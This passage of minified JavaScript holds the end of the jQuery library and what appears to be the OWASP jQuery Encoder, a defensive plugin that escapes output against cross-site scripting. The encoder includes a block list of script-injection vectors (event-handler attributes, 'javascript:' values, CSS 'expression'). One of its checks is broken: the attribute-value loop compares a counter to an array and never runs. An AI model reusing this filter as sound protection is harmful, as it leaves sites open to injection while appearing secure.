i,a,s,l,d,c,u,p,f=[o||ae],h=he.call(t,"type")?t.type:t,m=he.call(t,"namespace")?t.namespace.split("."):[];if(a=p=s=o=o||ae,3!==o.nodeType&&8!==o.nodeType&&!Ct.test(h+we.event.triggered)&&(h.indexOf(".")>-1&&(h=(m=h.split(".")).shift(),m.sort()),d=h.indexOf(":")<0&&"on"+h,(t=t[we.expando]?t:new we.Event(h,"object"==typeof t&&t)).isTrigger=r?2:3,t.namespace=m.join("."),t.rnamespace=t.namespace?new RegExp("(^|\\.)"+m.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,t.result=void 0,t.target||(t.target=o),n=null==n?[t]:we.makeArray(n,[t]),u=we.event.special[h]||{},r||!u.trigger||!1!==u.trigger.apply(o,n))){if(!r&&!u.noBubble&&!xe(o)){for(l=u.delegateType||h,Ct.test(l+h)||(a=a.parentNode);a;a=a.parentNode)f.push(a),s=a;s===(o.ownerDocument||ae)&&f.push(s.defaultView||s.parentWindow||e)}for(i=0;(a=f[i++])&&!t.isPropagationStopped();)p=a,t.type=i>1?l:u.bindType||h,(c=(Fe.get(a,"events")||{})[t.type]&&Fe.get(a,"handle"))&&c.apply(a,n),(c=d&&a[d])&&c.apply&&Re(a)&&(t.result=c.apply(a,n),!1===t.result&&t.preventDefault());return t.type=h,r||t.isDefaultPrevented()||u._default&&!1!==u._default.apply(f.pop(),n)||!Re(o)||d&&be(o[h])&&!xe(o)&&((s=o[d])&&(o[d]=null),we.event.triggered=h,t.isPropagationStopped()&&p.addEventListener(h,St),o[h](),t.isPropagationStopped()&&p.removeEventListener(h,St),we.event.triggered=void 0,s&&(o[d]=s)),t.result}},simulate:function(e,t,n){var o=we.extend(new we.Event,n,{type:e,isSimulated:!0});we.event.trigger(o,null,t)}}),we.fn.extend({trigger:function(e,t){return this.each(function(){we.event.trigger(e,t,this)})},triggerHandler:function(e,t){var n=this[0];if(n)return we.event.trigger(e,t,n,!0)}}),ye.focusin||we.each({focus:"focusin",blur:"focusout"},function(e,t){var n=function(e){we.event.simulate(t,e.target,we.event.fix(e))};we.event.special[t]={setup:function(){var o=this.ownerDocument||this,r=Fe.access(o,t);r||o.addEventListener(e,n,!0),Fe.access(o,t,(r||0)+1)},teardown:function(){var o=this.ownerDocument||this,r=Fe.access(o,t)-1;r?Fe.access(o,t,r):(o.removeEventListener(e,n,!0),Fe.remove(o,t))}}});var jt=e.location,Pt=Date.now(),Dt=/\?/;we.parseXML=function(t){var n;if(!t||"string"!=typeof t)return null;try{n=(new e.DOMParser).parseFromString(t,"text/xml")}catch(e){n=void 0}return n&&!n.getElementsByTagName("parsererror").length||we.error("Invalid XML: "+t),n};var Mt=/\[\]$/,At=/\r?\n/g,Lt=/^(?:submit|button|image|reset|file)$/i,Nt=/^(?:input|select|textarea|keygen)/i;we.param=function(e,t){var n,o=[],r=function(e,t){var n=be(t)?t():t;o[o.length]=encodeURIComponent(e)+"="+encodeURIComponent(null==n?"":n)};if(Array.isArray(e)||e.jquery&&!we.isPlainObject(e))we.each(e,function(){r(this.name,this.value)});else for(n in e)K(n,e[n],t,r);return o.join("&")},we.fn.extend({serialize:function(){return we.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=we.prop(this,"elements");return e?we.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!we(this).is(":disabled")&&Nt.test(this.nodeName)&&!Lt.test(e)&&(this.checked||!Xe.test(e))}).map(function(e,t){var n=we(this).val();return null==n?null:Array.isArray(n)?we.map(n,function(e){return{name:t.name,value:e.replace(At,"\r\n")}}):{name:t.name,value:n.replace(At,"\r\n")}}).get()}});var It=/%20/g,Ot=/#.*$/,zt=/([?&])_=[^&]*/,Rt=/^(.*?):[ \t]*([^\r\n]*)$/gm,Ft=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,Ht=/^(?:GET|HEAD)$/,qt=/^\/\//,Bt={},$t={},Wt="*/".concat("*"),Gt=ae.createElement("a");Gt.href=jt.href,we.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:jt.href,type:"GET",isLocal:Ft.test(jt.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":Wt,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":JSON.parse,"text xml":we.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?ne(ne(e,we.ajaxSettings),t):ne(we.ajaxSettings,e)},ajaxPrefilter:ee(Bt),ajaxTransport:ee($t),ajax:function(t,n){function o(t,n,o,s){var d,p,f,v,w,_=n;c||(c=!0,l&&e.clearTimeout(l),r=void 0,a=s||"",k.readyState=t>0?4:0,d=t>=200&&t<300||304===t,o&&(v=oe(h,k,o)),v=re(h,v,k,d),d?(h.ifModified&&((w=k.getResponseHeader("Last-Modified"))&&(we.lastModified[i]=w),(w=k.getResponseHeader("etag"))&&(we.etag[i]=w)),204===t||"HEAD"===h.type?_="nocontent":304===t?_="notmodified":(_=v.state,p=v.data,d=!(f=v.error))):(f=_,!t&&_||(_="error",t<0&&(t=0))),k.status=t,k.statusText=(n||_)+"",d?y.resolveWith(m,[p,_,k]):y.rejectWith(m,[k,_,f]),k.statusCode(x),x=void 0,u&&g.trigger(d?"ajaxSuccess":"ajaxError",[k,h,d?p:f]),b.fireWith(m,[k,_]),u&&(g.trigger("ajaxComplete",[k,h]),--we.active||we.event.trigger("ajaxStop")))}"object"==typeof t&&(n=t,t=void 0),n=n||{};var r,i,a,s,l,d,c,u,p,f,h=we.ajaxSetup({},n),m=h.context||h,g=h.context&&(m.nodeType||m.jquery)?we(m):we.event,y=we.Deferred(),b=we.Callbacks("once memory"),x=h.statusCode||{},v={},w={},_="canceled",k={readyState:0,getResponseHeader:function(e){var t;if(c){if(!s)for(s={};t=Rt.exec(a);)s[t[1].toLowerCase()]=t[2];t=s[e.toLowerCase()]}return null==t?null:t},getAllResponseHeaders:function(){return c?a:null},setRequestHeader:function(e,t){return null==c&&(e=w[e.toLowerCase()]=w[e.toLowerCase()]||e,v[e]=t),this},overrideMimeType:function(e){return null==c&&(h.mimeType=e),this},statusCode:function(e){var t;if(e)if(c)k.always(e[k.status]);else for(t in e)x[t]=[x[t],e[t]];return this},abort:function(e){var t=e||_;return r&&r.abort(t),o(0,t),this}};if(y.promise(k),h.url=((t||h.url||jt.href)+"").replace(qt,jt.protocol+"//"),h.type=n.method||n.type||h.method||h.type,h.dataTypes=(h.dataType||"*").toLowerCase().match(Ae)||[""],null==h.crossDomain){d=ae.createElement("a");try{d.href=h.url,d.href=d.href,h.crossDomain=Gt.protocol+"//"+Gt.host!=d.protocol+"//"+d.host}catch(e){h.crossDomain=!0}}if(h.data&&h.processData&&"string"!=typeof h.data&&(h.data=we.param(h.data,h.traditional)),te(Bt,h,n,k),c)return k;for(p in(u=we.event&&h.global)&&0==we.active++&&we.event.trigger("ajaxStart"),h.type=h.type.toUpperCase(),h.hasContent=!Ht.test(h.type),i=h.url.replace(Ot,""),h.hasContent?h.data&&h.processData&&0===(h.contentType||"").indexOf("application/x-www-form-urlencoded")&&(h.data=h.data.replace(It,"+")):(f=h.url.slice(i.length),h.data&&(h.processData||"string"==typeof h.data)&&(i+=(Dt.test(i)?"&":"?")+h.data,delete h.data),!1===h.cache&&(i=i.replace(zt,"$1"),f=(Dt.test(i)?"&":"?")+"_="+Pt+++f),h.url=i+f),h.ifModified&&(we.lastModified[i]&&k.setRequestHeader("If-Modified-Since",we.lastModified[i]),we.etag[i]&&k.setRequestHeader("If-None-Match",we.etag[i])),(h.data&&h.hasContent&&!1!==h.contentType||n.contentType)&&k.setRequestHeader("Content-Type",h.contentType),k.setRequestHeader("Accept",h.dataTypes[0]&&h.accepts[h.dataTypes[0]]?h.accepts[h.dataTypes[0]]+("*"!==h.dataTypes[0]?", "+Wt+"; q=0.01":""):h.accepts["*"]),h.headers)k.setRequestHeader(p,h.headers[p]);if(h.beforeSend&&(!1===h.beforeSend.call(m,k,h)||c))return k.abort();if(_="abort",b.add(h.complete),k.done(h.success),k.fail(h.error),r=te($t,h,n,k)){if(k.readyState=1,u&&g.trigger("ajaxSend",[k,h]),c)return k;h.async&&h.timeout>0&&(l=e.setTimeout(function(){k.abort("timeout")},h.timeout));try{c=!1,r.send(v,o)}catch(e){if(c)throw e;o(-1,e)}}else o(-1,"No Transport");return k},getJSON:function(e,t,n){return we.get(e,t,n,"json")},getScript:function(e,t){return we.get(e,void 0,t,"script")}}),we.each(["get","post"],function(e,t){we[t]=function(e,n,o,r){return be(n)&&(r=r||o,o=n,n=void 0),we.ajax(we.extend({url:e,type:t,dataType:r,data:n,success:o},we.isPlainObject(e)&&e))}}),we._evalUrl=function(e){return we.ajax({url:e,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,throws:!0})},we.fn.extend({wrapAll:function(e){var t;return this[0]&&(be(e)&&(e=e.call(this[0])),t=we(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){for(var e=this;e.firstElementChild;)e=e.firstElementChild;return e}).append(this)),this},wrapInner:function(e){return be(e)?this.each(function(t){we(this).wrapInner(e.call(this,t))}):this.each(function(){var t=we(this),n=t.contents();n.length?n.wrapAll(e):t.append(e)})},wrap:function(e){var t=be(e);return this.each(function(n){we(this).wrapAll(t?e.call(this,n):e)})},unwrap:function(e){return this.parent(e).not("body").each(function(){we(this).replaceWith(this.childNodes)}),this}}),we.expr.pseudos.hidden=function(e){return!we.expr.pseudos.visible(e)},we.expr.pseudos.visible=function(e){return!!(e.offsetWidth||e.offsetHeight||e.getClientRects().length)},we.ajaxSettings.xhr=function(){try{return new e.XMLHttpRequest}catch(e){}};var Ut={0:200,1223:204},Jt=we.ajaxSettings.xhr();ye.cors=!!Jt&&"withCredentials"in Jt,ye.ajax=Jt=!!Jt,we.ajaxTransport(function(t){var n,o;if(ye.cors||Jt&&!t.crossDomain)return{send:function(r,i){var a,s=t.xhr();if(s.open(t.type,t.url,t.async,t.username,t.password),t.xhrFields)for(a in t.xhrFields)s[a]=t.xhrFields[a];for(a in t.mimeType&&s.overrideMimeType&&s.overrideMimeType(t.mimeType),t.crossDomain||r["X-Requested-With"]||(r["X-Requested-With"]="XMLHttpRequest"),r)s.setRequestHeader(a,r[a]);n=function(e){return function(){n&&(n=o=s.onload=s.onerror=s.onabort=s.ontimeout=s.onreadystatechange=null,"abort"===e?s.abort():"error"===e?"number"!=typeof s.status?i(0,"error"):i(s.status,s.statusText):i(Ut[s.status]||s.status,s.statusText,"text"!==(s.responseType||"text")||"string"!=typeof s.responseText?{binary:s.response}:{text:s.responseText},s.getAllResponseHeaders()))}},s.onload=n(),o=s.onerror=s.ontimeout=n("error"),void 0!==s.onabort?s.onabort=o:s.onreadystatechange=function(){4===s.readyState&&e.setTimeout(function(){n&&o()})},n=n("abort");try{s.send(t.hasContent&&t.data||null)}catch(e){if(n)throw e}},abort:function(){n&&n()}}}),we.ajaxPrefilter(function(e){e.crossDomain&&(e.contents.script=!1)}),we.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(e){return we.globalEval(e),e}}}),we.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),we.ajaxTransport("script",function(e){var t,n;if(e.crossDomain)return{send:function(o,r){t=we("<script>").prop({charset:e.scriptCharset,src:e.url}).on("load error",n=function(e){t.remove(),n=null,e&&r("error"===e.type?404:200,e.type)}),ae.head.appendChild(t[0])},abort:function(){n&&n()}}});var Zt=[],Xt=/(=)\?(?=&|$)|\?\?/;we.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Zt.pop()||we.expando+"_"+Pt++;return this[e]=!0,e}}),we.ajaxPrefilter("json jsonp",function(t,n,o){var r,i,a,s=!1!==t.jsonp&&(Xt.test(t.url)?"url":"string"==typeof t.data&&0===(t.contentType||"").indexOf("application/x-www-form-urlencoded")&&Xt.test(t.data)&&"data");if(s||"jsonp"===t.dataTypes[0])return r=t.jsonpCallback=be(t.jsonpCallback)?t.jsonpCallback():t.jsonpCallback,s?t[s]=t[s].replace(Xt,"$1"+r):!1!==t.jsonp&&(t.url+=(Dt.test(t.url)?"&":"?")+t.jsonp+"="+r),t.converters["script json"]=function(){return a||we.error(r+" was not called"),a[0]},t.dataTypes[0]="json",i=e[r],e[r]=function(){a=arguments},o.always(function(){void 0===i?we(e).removeProp(r):e[r]=i,t[r]&&(t.jsonpCallback=n.jsonpCallback,Zt.push(r)),a&&be(i)&&i(a[0]),a=i=void 0}),"script"}),ye.createHTMLDocument=function(){var e=ae.implementation.createHTMLDocument("").body;return e.innerHTML="<form></form><form></form>",2===e.childNodes.length}(),we.parseHTML=function(e,t,n){return"string"!=typeof e?[]:("boolean"==typeof t&&(n=t,t=!1),t||(ye.createHTMLDocument?((o=(t=ae.implementation.createHTMLDocument("")).createElement("base")).href=ae.location.href,t.head.appendChild(o)):t=ae),i=!n&&[],(r=Se.exec(e))?[t.createElement(r[1])]:(r=k([e],t,i),i&&i.length&&we(i).remove(),we.merge([],r.childNodes)));var o,r,i},we.fn.load=function(e,t,n){var o,r,i,a=this,s=e.indexOf(" ");return s>-1&&(o=V(e.slice(s)),e=e.slice(0,s)),be(t)?(n=t,t=void 0):t&&"object"==typeof t&&(r="POST"),a.length>0&&we.ajax({url:e,type:r||"GET",dataType:"html",data:t}).done(function(e){i=arguments,a.html(o?we("<div>").append(we.parseHTML(e)).find(o):e)}).always(n&&function(e,t){a.each(function(){n.apply(this,i||[e.responseText,t,e])})}),this},we.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){we.fn[t]=function(e){return this.on(t,e)}}),we.expr.pseudos.animated=function(e){return we.grep(we.timers,function(t){return e===t.elem}).length},we.offset={setOffset:function(e,t,n){var o,r,i,a,s,l,d=we.css(e,"position"),c=we(e),u={};"static"===d&&(e.style.position="relative"),s=c.offset(),i=we.css(e,"top"),l=we.css(e,"left"),("absolute"===d||"fixed"===d)&&(i+l).indexOf("auto")>-1?(a=(o=c.position()).top,r=o.left):(a=parseFloat(i)||0,r=parseFloat(l)||0),be(t)&&(t=t.call(e,n,we.extend({},s))),null!=t.top&&(u.top=t.top-s.top+a),null!=t.left&&(u.left=t.left-s.left+r),"using"in t?t.using.call(e,u):c.css(u)}},we.fn.extend({offset:function(e){if(arguments.length)return void 0===e?this:this.each(function(t){we.offset.setOffset(this,e,t)});var t,n,o=this[0];return o?o.getClientRects().length?(t=o.getBoundingClientRect(),n=o.ownerDocument.defaultView,{top:t.top+n.pageYOffset,left:t.left+n.pageXOffset}):{top:0,left:0}:void 0},position:function(){if(this[0]){var e,t,n,o=this[0],r={top:0,left:0};if("fixed"===we.css(o,"position"))t=o.getBoundingClientRect();else{for(t=this.offset(),n=o.ownerDocument,e=o.offsetParent||n.documentElement;e&&(e===n.body||e===n.documentElement)&&"static"===we.css(e,"position");)e=e.parentNode;e&&e!==o&&1===e.nodeType&&((r=we(e).offset()).top+=we.css(e,"borderTopWidth",!0),r.left+=we.css(e,"borderLeftWidth",!0))}return{top:t.top-r.top-we.css(o,"marginTop",!0),left:t.left-r.left-we.css(o,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){for(var e=this.offsetParent;e&&"static"===we.css(e,"position");)e=e.offsetParent;return e||et})}}),we.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(e,t){var n="pageYOffset"===t;we.fn[e]=function(o){return Ie(this,function(e,o,r){var i;if(xe(e)?i=e:9===e.nodeType&&(i=e.defaultView),void 0===r)return i?i[t]:e[o];i?i.scrollTo(n?i.pageXOffset:r,n?r:i.pageYOffset):e[o]=r},e,o,arguments.length)}}),we.each(["top","left"],function(e,t){we.cssHooks[t]=O(ye.pixelPosition,function(e,n){if(n)return n=I(e,t),lt.test(n)?we(e).position()[t]+"px":n})}),we.each({Height:"height",Width:"width"},function(e,t){we.each({padding:"inner"+e,content:t,"":"outer"+e},function(n,o){we.fn[o]=function(r,i){var a=arguments.length&&(n||"boolean"!=typeof r),s=n||(!0===r||!0===i?"margin":"border");return Ie(this,function(t,n,r){var i;return xe(t)?0===o.indexOf("outer")?t["inner"+e]:t.document.documentElement["client"+e]:9===t.nodeType?(i=t.documentElement,Math.max(t.body["scroll"+e],i["scroll"+e],t.body["offset"+e],i["offset"+e],i["client"+e])):void 0===r?we.css(t,n,s):we.style(t,n,r,s)},t,a?r:void 0,a)}})}),we.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,t){we.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),we.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),we.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,o){return this.on(t,e,n,o)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}}),we.proxy=function(e,t){var n,o,r;if("string"==typeof t&&(n=e[t],t=e,e=n),be(e))return o=le.call(arguments,2),(r=function(){return e.apply(t||this,o.concat(le.call(arguments)))}).guid=e.guid=e.guid||we.guid++,r},we.holdReady=function(e){e?we.readyWait++:we.ready(!0)},we.isArray=Array.isArray,we.parseJSON=JSON.parse,we.nodeName=i,we.isFunction=be,we.isWindow=xe,we.camelCase=h,we.type=o,we.now=Date.now,we.isNumeric=function(e){var t=we.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},"function"==typeof define&&define.amd&&define("jquery",[],function(){return we});var Vt=e.jQuery,Qt=e.$;return we.noConflict=function(t){return e.$===we&&(e.$=Qt),t&&e.jQuery===we&&(e.jQuery=Vt),we},t||(e.jQuery=e.$=we),we}),function(e){var t={js:[",",".","_"," "]},n={"default":[",",".","-","_"," "]},o={width:["%"],height:["%"]},r={"default":["-"," ","%"],color:["#"," ","(",")"],image:["(",")",":","/","?","&","-",".",'"',"="," "]},i={background:["(",")",":","%","/","?","&","-"," ",".",'"',"=","#"],"background-image":r.image,"background-color":r.color,"border-color":r.color,"border-image":r.image,color:r.color,icon:r.image,"list-style-image":r.image,"outline-color":r.color},a={attr_name:["on[a-z]{1,}","style","href","src"],attr_val:["javascript:"],css_key:["behavior","-moz-behavior","-ms-behavior"],css_val:["expression"]},s={blacklist:!0},l=!1;e.encoder={author:"Chris Schmidt (chris.schmidt@owasp.org)",version:"${project.version}",init:function(t){if(l)throw"jQuery Encoder has already been initialized - cannot set options after initialization";l=!0,e.extend(s,t)},encodeForHTML:function(t){l=!0;var n=document.createElement("div");return e(n).text(t),e(n).html()},encodeForHTMLAttribute:function(t,r,i){if(l=!0,t=e.encoder.canonicalize(t).toLowerCase(),r=e.encoder.canonicalize(r),e.inArray(t,a.attr_name)>=0)throw"Unsafe attribute name used: "+t;for(var s=0;s<a.attr_val;s++)if(r.toLowerCase().match(a.attr_val[s]))throw"Unsafe attribute value used: "+r;immune=o[t],immune||(immune=n["default"]);var d="";if(!i){for(var c=0;c<t.length;c++){var u=t.charAt(c);if(!u.match(/[a-zA-Z\-0-9]/))throw"Invalid attribute name specified";d+=u}d+='="'}for(var p=0;p<r.length;p++){var f=r.charAt(p),h=r.charCodeAt(p);if(!f.match(/[a-zA-Z0-9]/)&&e.inArray(f,immune)<0)d+="&#x"+h.toString(16)+";";else d+=f}return i||(d+='"'),d},encodeForCSS:function(t,n,o){if(l=!0,t=e.encoder.canonicalize(t).toLowerCase(),n=e.encoder.canonicalize(n),e.inArray(t,a.css_key)>=0)throw"Unsafe property name used: "+t;for(var s=0;s<a.css_val.length;s++)if(n.toLowerCase().indexOf(a.css_val[s])>=0)throw"Unsafe property value used: "+n;immune=i[t],immune||(immune=r["default"]);var d="";if(!o){for(var c=0;c<t.length;c++){var u=t.charAt(c);if(!u.match(/[a-zA-Z\-]/))throw"Invalid Property Name specified";d+=u}d+=": "}for(var p=0;p<n.length;p++){var f=n.charAt(p),h=n.charCodeAt(p);if(!f.match(/[a-zA-Z0-9]/)&&e.inArray(f,immune)<0){var m=h.toString(16);d+="\\"+"000000".substr(m.length)+m}else d+=f}return d},encodeForURL:function(t,n){l=!0;var o="";if(n){if(!n.match(/^[A-Za-z\-0-9]{1,}$/))throw"Illegal Attribute Name Specified";o+=e.encoder.canonicalize(n).toLowerCase(),o+='="'}return o+=encodeURIComponent(t),
o+=n?'"':""},encodeForJavascript:function(n){l=!0,immune=t.js;for(var o="",r=0;r<n.length;r++){var i=n.charAt(r),a=n.charCodeAt(r);if(e.inArray(i,immune)>=0||null==d[a])o+=i;else{var s=a.toString(16);o+=a<256?"\\x"+"00".substr(s.length)+s.toUpperCase():"\\u"+"0000".substr(s.length)+s.toUpperCase()}}return o},canonicalize:function(e,t){if(l=!0,null===e)return null;for(var n=e,o=e,r=0,i=[new h,new m,new g];;){o=n;for(var a=0;a<i.length;a++){var s=i[a].decode(n);s!=n&&(r++,n=s)}if(o==n)break;0}if(t&&r>1)throw"Attack Detected - Multiple/Double Encodings used in input";return n}};for(var d=[],c=0;c<255;c++)d[c]=c>=48&&c<=57||c>=65&&c<=90||c>=97&&c<=122?null:c.toString(16);var u={html:function(t){return e.encoder.encodeForHTML(t.unsafe)},css:function(t){var n=[],o=[];for(var r in t.map?n=t.map:n[t.name]=t.unsafe,n)"function"!=typeof n[r]&&n.hasOwnProperty(r)&&(o[r]=e.encoder.encodeForCSS(r,n[r],!0));return o},attr:function(t){var n=[],o=[];for(var r in t.map?n=t.map:n[t.name]=t.unsafe,n)"function"!=typeof n[r]&&n.hasOwnProperty(r)&&(o[r]=e.encoder.encodeForHTMLAttribute(r,n[r],!0));return o}};e.fn.encode=function(){l=!0;var t={context:"html",unsafe:null,name:null,map:null,setter:null,strict:!0};return 1==arguments.length&&"object"==typeof arguments[0]?e.extend(t,arguments[0]):(t.context=arguments[0],2==arguments.length?"html"==t.context?t.unsafe=arguments[1]:"attr"!=t.content&&"css"!=t.content||(t.map=arguments[1]):(t.name=arguments[1],t.unsafe=arguments[2])),"html"==t.context?t.setter=this.html:"css"==t.context?t.setter=this.css:"attr"==t.context&&(t.setter=this.attr),t.setter.call(this,u[t.context].call(this,t))};var p=Class.extend({_input:null,_pushback:null,_temp:null,_index:0,_mark:0,_hasNext:function(){return null!=this._input&&(0!=this._input.length&&this._index<this._input.length)},init:function(e){this._input=e},pushback:function(e){this._pushback=e},index:function(){return this._index},hasNext:function(){return null!=this._pushback||this._hasNext()},next:function(){if(null!=this._pushback){var e=this._pushback;return this._pushback=null,e}return this._hasNext()?this._input.charAt(this._index++):null},nextHex:function(){var e=this.next();return null==e?null:e.match(/[0-9A-Fa-f]/)?e:null},peek:function(e){return e?!(!this._pushback||this._pushback!=e)||!!this._hasNext()&&this._input.charAt(this._index)==e:this._pushback?this._pushback:this._hasNext()?this._input.charAt(this._index):null},mark:function(){this._temp=this._pushback,this._mark=this._index},reset:function(){this._pushback=this._temp,this._index=this._mark},remainder:function(){var e=this._input.substr(this._index);return null!=this._pushback&&(e=this._pushback+e),e}}),f=Class.extend({decode:function(e){for(var t="",n=new p(e);n.hasNext();){var o=this.decodeCharacter(n);t+=null!=o?o:n.next()}return t},decodeCharacter:function(e){return e.next()}}),h=f.extend({decodeCharacter:function(e){e.mark();var t=e.next();if(null==t||"&"!=t)return e.reset(),null;var n,o=e.next();if(null==o)return e.reset(),null;if("#"==o){if(null!=(n=this._getNumericEntity(e)))return n}else if(o.match(/[A-Za-z]/)&&(e.pushback(o),null!=(n=this._getNamedEntity(e))))return n;return e.reset(),null},_getNamedEntity:function(e){var t,n,o="";n=Math.min(e.remainder().length,_.getMaxKeyLength());for(var r=0;r<n;r++)o+=e.next().toLowerCase();if(null==(t=_.getLongestMatch(o)))return null;e.reset(),e.next(),n=t.getKey().length;for(var i=0;i<n;i++)e.next();return e.peek(";")&&e.next(),t.getValue()},_getNumericEntity:function(e){var t=e.peek();return null==t?null:"x"==t||"X"==t?(e.next(),this._parseHex(e)):this._parseNumber(e)},_parseHex:function(e){for(var t="";e.hasNext();){var n=e.peek();if(isNaN(parseInt(n,16))){if(";"==n){e.next();break}break}t+=n,e.next()}var o=parseInt(t,16);return!isNaN(o)&&b(o)?String.fromCharCode(o):null},_parseNumber:function(e){for(var t="";e.hasNext();){var n=e.peek();if(isNaN(parseInt(n,10))){if(";"==n){e.next();break}break}t+=n,e.next()}var o=parseInt(t,10);return!isNaN(o)&&b(o)?String.fromCharCode(o):null}}),m=f.extend({decodeCharacter:function(e){e.mark();var t=e.next();if(null==t)return e.reset(),null;if("%"!=t)return e.reset(),null;for(var n="",o=0;o<2;o++){var r=e.nextHex();null!=r&&(n+=r)}if(2==n.length){var i=parseInt(n,16);if(b(i))return String.fromCharCode(i)}return e.reset(),null}}),g=f.extend({decodeCharacter:function(e){e.mark();var t=e.next();if(null==t||"\\"!=t)return e.reset(),null;var n=e.next();if(null==n)return e.reset(),null;switch(n){case"\r":e.peek("\n")&&e.next();case"\n":case"\f":case"\0":return this.decodeCharacter(e)}if("NaN"==parseInt(n,16))return n;for(var o=n,r=0;r<5;r++){var i=e.next();if(null==i||x(i))break;if("NaN"==parseInt(i,16)){e.pushback(i);break}o+=i}var a=parseInt(o,16);return b(a)?String.fromCharCode(a):"\ufffd"}}),y=Class.extend({root:null,maxKeyLen:0,size:0,init:function(){this.clear()},getLongestMatch:function(e){return null==this.root&&null==e?null:this.root.getLongestMatch(e,0)},getMaxKeyLength:function(){return this.maxKeyLen},clear:function(){this.root=null,this.maxKeyLen=0,this.size=0},put:function(e,t){var n;return null==this.root&&(this.root=new y.Node),null!=(n=this.root.put(e,0,t))?n:(e.length>this.maxKeyLen&&(this.maxKeyLen=e.length),this.size++,null)}});y.Entry=Class.extend({_key:null,_value:null,init:function(e,t){this._key=e,this._value=t},getKey:function(){return this._key},getValue:function(){return this._value},equals:function(e){return e instanceof y.Entry&&(this._key==e._key&&this._value==e._value)}}),y.Node=Class.extend({_value:null,_nextMap:null,setValue:function(e){this._value=e},getNextNode:function(e){return this._nextMap?this._nextMap[e]:null},put:function(e,t,n){var o,r,i;return e.length==t?(i=this._value,this.setValue(n),i):(r=e.charAt(t),null==this._nextMap?(this._nextMap=y.Node.newNodeMap(),o=new y.Node,this._nextMap[r]=o):null==(o=this._nextMap[r])&&(o=new y.Node,this._nextMap[r]=o),o.put(e,t+1,n))},get:function(e,t){var n;return e.length<=t?this._value:null==(n=this.getNextNode(e.charAt(t)))?null:n.get(e,t+1)},getLongestMatch:function(e,t){var n,o;return e.length<=t?y.Entry.newInstanceIfNeeded(e,this._value):null==(n=this.getNextNode(e.charAt(t)))?y.Entry.newInstanceIfNeeded(e,t,this._value):null!=(o=n.getLongestMatch(e,t+1))?o:y.Entry.newInstanceIfNeeded(e,t,this._value)}}),y.Entry.newInstanceIfNeeded=function(){var e,t,n=arguments[0];return"string"==typeof arguments[1]?(e=arguments[1],t=n.length):(t=arguments[1],e=arguments[2]),null==e||null==n?null:(n.length>t&&(n=n.substr(0,t)),new y.Entry(n,e))},y.Node.newNodeMap=function(){return{}};var b=function(e){return e>=0&&e<=1114111},x=function(e){return e.match(/[\s]/)},v=[],w=[],_=new y;!function(){for(var e in v["&quot"]="34",v["&amp"]="38",v["&lt"]="60",v["&gt"]="62",v["&nbsp"]="160",v["&iexcl"]="161",v["&cent"]="162",v["&pound"]="163",v["&curren"]="164",v["&yen"]="165",v["&brvbar"]="166",v["&sect"]="167",v["&uml"]="168",v["&copy"]="169",v["&ordf"]="170",v["&laquo"]="171",v["&not"]="172",v["&shy"]="173",v["&reg"]="174",v["&macr"]="175",v["&deg"]="176",v["&plusmn"]="177",v["&sup2"]="178",v["&sup3"]="179",v["&acute"]="180",v["&micro"]="181",v["&para"]="182",v["&middot"]="183",v["&cedil"]="184",v["&sup1"]="185",v["&ordm"]="186",v["&raquo"]="187",v["&frac14"]="188",v["&frac12"]="189",v["&frac34"]="190",v["&iquest"]="191",v["&Agrave"]="192",v["&Aacute"]="193",v["&Acirc"]="194",v["&Atilde"]="195",v["&Auml"]="196",v["&Aring"]="197",v["&AElig"]="198",v["&Ccedil"]="199",v["&Egrave"]="200",v["&Eacute"]="201",v["&Ecirc"]="202",v["&Euml"]="203",v["&Igrave"]="204",v["&Iacute"]="205",v["&Icirc"]="206",v["&Iuml"]="207",v["&ETH"]="208",v["&Ntilde"]="209",v["&Ograve"]="210",v["&Oacute"]="211",v["&Ocirc"]="212",v["&Otilde"]="213",v["&Ouml"]="214",v["&times"]="215",v["&Oslash"]="216",v["&Ugrave"]="217",v["&Uacute"]="218",v["&Ucirc"]="219",v["&Uuml"]="220",v["&Yacute"]="221",v["&THORN"]="222",v["&szlig"]="223",v["&agrave"]="224",v["&aacute"]="225",v["&acirc"]="226",v["&atilde"]="227",v["&auml"]="228",v["&aring"]="229",v["&aelig"]="230",v["&ccedil"]="231",v["&egrave"]="232",v["&eacute"]="233",v["&ecirc"]="234",v["&euml"]="235",v["&igrave"]="236",v["&iacute"]="237",v["&icirc"]="238",v["&iuml"]="239",v["&eth"]="240",v["&ntilde"]="241",v["&ograve"]="242",v["&oacute"]="243",v["&ocirc"]="244",v["&otilde"]="245",v["&ouml"]="246",v["&divide"]="247",v["&oslash"]="248",v["&ugrave"]="249",v["&uacute"]="2